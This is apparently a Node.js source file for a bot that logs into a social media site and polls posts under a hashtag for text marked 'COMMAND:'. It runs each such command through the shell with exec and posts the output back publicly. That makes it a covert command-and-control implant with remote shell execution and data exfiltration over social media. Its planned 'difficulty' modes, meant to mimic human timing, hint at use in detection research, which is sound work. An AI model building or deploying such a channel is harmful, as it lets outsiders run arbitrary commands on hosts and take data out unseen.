require('dotenv').config();
const path = require('path');
const { exec } = require('child_process');

const { login, acceptCookies } = require('./lib/login.js');
const Commands = require('./lib/commands.js');
const { log, sleep, Difficulty } = require('../utils/utils.js');
const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
const MESSAGES = require('../config/messages.js');

USER = process.env.BOT_EMAIL;
PASS = process.env.BOT_PASSWORD;
VERIFICATION = process.env.BOT_VERIFICATION;
BROWSER = process.env.BROWSER;
HEADLESS = process.env.HEADLESS == "true" ? "new" : false;
TOPIC = process.env.TOPIC;

const nextAction = () => {
	log(MESSAGES.EMPTY);
	sleep(COMMANDS.DELAY);
}

async function queryCommand(commands) {
	return await new Promise(async (resolve) => {
		console.log(MESSAGES.COMMAND_WAITING);
		
		// return to communication channel
		commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, { waitUntil: 'networkidle2' });
	
		const latest = await commands.getTimelinePost(1);
		if (!latest)
			return resolve(null);
	
		let content = await commands.getPostContent(latest);
	
		content = content.replace(`#${TOPIC}`, "").trim();
	
		if (content.startsWith("COMMAND:")) {
			const command = content.replace("COMMAND:", "").trim().split("[")[0];
			log(MESSAGES.COMMAND_RECEIVED.format(command));
	
			return resolve(command);
		}
		
		return resolve(null);
	});
}

async function executeCommand(command) {
	return new Promise((resolve) => {
		exec(command, (err, stdout, stderr) => {
			resolve({ stdout, stderr });
		});
	});
}

async function sendResult(commands, result) {
	log(result);

	result = "OUTPUT: " + result + `[${Date.now()}]`;
	await commands.makePost(result, [`#${TOPIC}`]);
}

const waitTime = (difficulty) => {
	switch (difficulty) {
		case Difficulty.Dumb:
			return COMMUNICATION.CHECK_INTERVAL;
		case Difficulty.Regular:
			// TODO: implement
			// random time
			return 0;
		case Difficulty.Advanced:
			// TODO: implement
			// simulate human behavior
			// two instances:
			// 1. time to wait until new check
			// 2. time within an activity burst (p.e.: sending 3 commands in a row, separated by this time (or if only 1 command, then do other things))
			return 0;
		default:
			return COMMUNICATION.CHECK_INTERVAL;
	}
}

let difficulty = Difficulty.Dumb;

// run bot
(async () => {
	log(MESSAGES.STARTING.format(path.basename(__filename).replace(".js", "")));

	// parse arguments
	const args = process.argv.slice(2);
	if (args.length > 0) {
		difficulty = parseInt(args[0]);
	}

	const page = await login(USER, PASS, VERIFICATION, URLS.LOGIN, BROWSER, HEADLESS);
	nextAction();
	await acceptCookies(page);
	nextAction();

	const commands = new Commands(page);

	// open communication channel and pass timestamp
	await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`]);
	nextAction();

	// wait for command from commander
	while (true) {
		const command = await queryCommand(commands);
		if (command) {
			// Execute the command and wait for it to complete
			let { stdout, stderr } = await executeCommand(command);
			if (stderr) {
				log(stderr);
				continue;
			}
	
			// Send the result back to the commander
			await sendResult(commands, stdout);
		}

		// wait for next action
		await sleep(waitTime(difficulty));
	}
})();